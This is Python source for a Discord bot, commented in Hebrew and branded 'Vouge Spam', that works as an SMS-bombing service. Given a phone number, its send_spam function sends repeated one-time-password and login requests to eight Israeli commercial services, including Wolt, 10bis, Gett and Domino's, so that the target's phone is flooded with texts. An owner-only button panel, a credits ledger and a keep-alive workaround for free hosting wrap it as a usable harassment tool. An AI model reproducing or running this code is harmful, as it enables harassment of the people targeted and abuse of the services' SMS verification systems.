import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import httpx
import asyncio
from flask import Flask
from threading import Thread
import datetime

# --- מעקף Render (שומר על הבוט דלוק בחינם) ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run_flask).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"
BOT_ID_SYNC = "1499077731659284540"

def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {"credits": {}, "blacklist": [], "last_daily": {}}
    return {"credits": {}, "blacklist": [], "last_daily": {}}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

# --- בדיקת הרשאת אדמין גלובלית ---
def is_owner_check():
    async def predicate(interaction: discord.Interaction):
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if role:
            return True
        await interaction.response.send_message("❌ פקודה זו סגורה למשתמשי Owner בלבד!", ephemeral=True)
        return False
    return app_commands.check(predicate)

# --- מנוע ה-Spam ---
async def send_spam(phone_val):
    endpoints = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone_val[1:]}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone_val, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone_val}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone_val}},
        {"url": "https://gett-israel.co.il/api/v1/auth/login", "json": {"phone": phone_val}},
        {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone_val}},
        {"url": "https://rebar.co.il/api/v1/auth/login", "json": {"phone": phone_val}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(headers=headers, timeout=5.0) as client:
        for _ in range(2):
            tasks = [client.post(api["url"], json=api.get("json")) for api in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(2)

# --- ממשק משתמש ---
class SpamModal(discord.ui.Modal, title="Vouge Spam - Admin Access"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        phone_val = self.phone.value
        if phone_val in data["blacklist"]:
            return await interaction.response.send_message(f"❌ המספר חסום!", ephemeral=True)
        
        await interaction.response.send_message(f"🚀 Owner מפעיל הפצצה על {phone_val}...", ephemeral=True)
        await send_spam(phone_val)

class SpamView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spam_btn")
    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        # בדיקה נוספת על הכפתור עצמו
        if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
            return await interaction.response.send_message("❌ רק Owner יכול להשתמש בכפתור!", ephemeral=True)
        await interaction.response.send_modal(SpamModal())

# --- הבוט וכל הפקודות (נעולות ל-Owner) ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()

bot = MyBot()

@bot.tree.command(name="setup", description="הצגת פאנל ההפצצה (Owner Only)")
@is_owner_check()
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🤖 Vouge Spam Me - Premium", description="גישת אדמין מאושרת.\nלחץ על הכפתור כדי להתחיל.", color=discord.Color.dark_red())
    await interaction.response.send_message(embed=embed, view=SpamView())

@bot.tree.command(name="credits", description="בדיקת יתרה (Owner Only)")
@is_owner_check()
async def credits_check(interaction: discord.Interaction):
    data = load_data()
    # סנכרון עם ה-ID שביקשת
    balance = data["credits"].get(BOT_ID_SYNC, 0)
    await interaction.response.send_message(f"💰 יתרה של הבוט: `{balance}`", ephemeral=True)

@bot.tree.command(name="add_credits", description="הוספת קרדיטים (Owner Only)")
@is_owner_check()
async def add_cr(interaction: discord.Interaction, member: discord.Member, amount: int):
    data = load_data()
    uid = str(member.id)
    data["credits"][uid] = data["credits"].get(uid, 0) + amount
    save_data(data)
    await interaction.response.send_message(f"✅ נוספו {amount} ל-{member.mention}")

@bot.tree.command(name="blacklist_add", description="חסימת מספר (Owner Only)")
@is_owner_check()
async def bl_add(interaction: discord.Interaction, phone: str):
    data = load_data()
    if phone not in data["blacklist"]: data["blacklist"].append(phone)
    save_data(data)
    await interaction.response.send_message(f"🚫 {phone} נחסם במערכת.")

@bot.tree.command(name="restart", description="אתחול הבוט (Owner Only)")
@is_owner_check()
async def restart(interaction: discord.Interaction):
    await interaction.response.send_message("🔄 ריסטארט...")
    os._exit(1)

@bot.tree.command(name="help", description="רשימת פקודות (Owner Only)")
@is_owner_check()
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(title="Vouge Admin Commands", color=discord.Color.blue())
    embed.description = "כל הפקודות בבוט זה זמינות למנהלים בלבד."
    embed.add_field(name="Commands", value="`/setup`, `/credits`, `/add_credits`, `/blacklist_add`, `/restart`", inline=False)
    await interaction.response.send_message(embed=embed)

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
